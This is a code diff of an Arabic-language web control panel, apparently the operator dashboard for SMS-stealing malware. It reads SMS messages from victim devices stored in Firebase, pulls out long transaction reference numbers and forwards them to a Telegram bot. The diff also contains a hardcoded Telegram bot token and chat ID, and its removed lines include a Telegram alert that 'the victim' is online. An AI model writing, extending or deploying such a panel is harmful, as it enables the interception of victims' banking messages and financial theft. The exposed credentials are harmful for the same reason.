@@ -1,56 +1,3 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abbas Pro - Security Fixed</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <style>
-        :root { --main: #003366; --gold: #d4af37; --bg: #f4f7f6; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; padding: 10px; }
-        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--main); }
-        .header { background: var(--main); color: white; padding: 20px; text-align: center; }
-        .content { padding: 20px; }
-        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
-        .btn-on { background: #27ae60; color: white; }
-        .btn-off { background: #e74c3c; color: white; }
-        .btn-turbo { background: var(--gold); color: white; border: 2px solid #b8962e; }
-        .section { background: #f9f9f9; border-radius: 12px; padding: 12px; margin-top: 15px; border-right: 4px solid var(--main); }
-        .trans-id { color: #d35400; font-weight: bold; font-family: monospace; background: #fff3e0; padding: 2px 5px; border-radius: 4px; border: 1px solid #ffcc80; }
-        .footer { text-align: center; padding: 15px; font-size: 12px; color: #888; background: #eee; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <div class="header">
-        <h2 style="margin:0;">نظام عباس الدولي v2.0</h2>
-        <p style="font-size:11px; opacity:0.8;">تم تحديث الحماية وتفعيل التليجرام</p>
-    </div>
-
-    <div class="content">
-        <div id="stat" style="text-align:center; font-weight:bold; margin-bottom:15px; color:#333;">جاري فحص الاتصال...</div>
-        
-        <button id="mainBtn" class="btn" onclick="toggleStatus()">تحميل...</button>
-        <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">الوضع الخارق: تحميل...</button>
-
-        <div class="section" style="border-right-color: #d35400;">
-            <strong style="color:#d35400">آخر رقم مرجعي (Ref ID):</strong>
-            <div id="extractedTrans" style="font-size:13px; margin-top:5px;">في انتظار أول عملية...</div>
-        </div>
-
-        <div class="section">
-            <strong style="color:var(--main)">سجل الأنشطة الحية:</strong>
-            <div id="logs" style="font-size:13px; margin-top:5px;"></div>
-        </div>
-    </div>
-
-    <div class="footer">برمجة وتصميم - عباس الدولي@2026</div>
-</div>
-
-<script>
-    // بيانات التليجرام الخاصة بك
     const teleToken = "8308447003:AAFhOi_gqBO6FMg5tHJzhAZ_4OgLDvFkJOo";
     const teleChatId = "5957156447";
 
@@ -69,9 +16,7 @@
     const db = firebase.database();
     let status = false, turbo = false;
 
-    // رسالة اختبار عند فتح اللوحة لأول مرة
-    console.log("System Started");
-
+    // مراقبة حالة التحكم
     db.ref('control/status').on('value', snap => {
         status = snap.val() === "true" || snap.val() === true;
         document.getElementById('stat').innerText = "النظام: " + (status ? "نشط" : "متوقف");
@@ -88,23 +33,28 @@
     function toggleStatus() { db.ref('control/status').set(status ? "false" : "true"); }
     function toggleTurbo() { db.ref('control/turbo').set(turbo ? "false" : "true"); }
 
-    db.ref('MyActivities').limitToLast(1).on('child_added', snap => {
-        const msg = snap.val();
-        if(msg.includes("فتح") || msg.includes("دخول")) {
-            sendTele("🚨 تنبيه: الضحية متصل الآن!");
-        }
-        const match = msg.match(/\d{10,}/); 
-        if (match) {
-            sendTele("✅ رقم عملية جديد: " + match[0]);
-            document.getElementById('extractedTrans').innerHTML = `<div>🔢 ID: <span class="trans-id">${match[0]}</span></div>`;
+    // تعديل المسار ليقرأ من Activate بدلاً من MyActivities
+    db.ref('Activate').on('child_added', snap => {
+        const deviceData = snap.val();
+        const smsContent = deviceData.SMS || ""; 
+        
+        if(smsContent !== "") {
+            document.getElementById('logs').innerHTML = `<div>• وصل رسالة جديدة من جهاز: ${snap.key}</div>` + document.getElementById('logs').innerHTML;
+            
+            // استخراج الرقم المرجعي إذا وجد في الرسالة
+            const match = smsContent.match(/\d{10,}/); 
+            if (match) {
+                sendTele("✅ عملية جديدة من جهاز " + snap.key + ": " + match[0]);
+                document.getElementById('extractedTrans').innerHTML = `<div>🔢 ID: <span class="trans-id">${match[0]}</span></div>`;
+            }
         }
     });
 
-    db.ref('MyActivities').limitToLast(5).on('value', snap => {
+    // عرض سجل الأنشطة من مسار الأجهزة
+    db.ref('Activate').limitToLast(5).on('value', snap => {
         const d = document.getElementById('logs'); d.innerHTML = "";
-        const data = []; snap.forEach(c => { data.push(c.val()); });
-        data.reverse().forEach(m => { d.innerHTML += `<div>• ${m}</div>`; });
+        snap.forEach(c => {
+            const val = c.val();
+            if(val.SMS) d.innerHTML += `<div>• جهاز ${c.key}: ${val.SMS}</div>`;
+        });
     });
-</script>
-</body>
-</html>
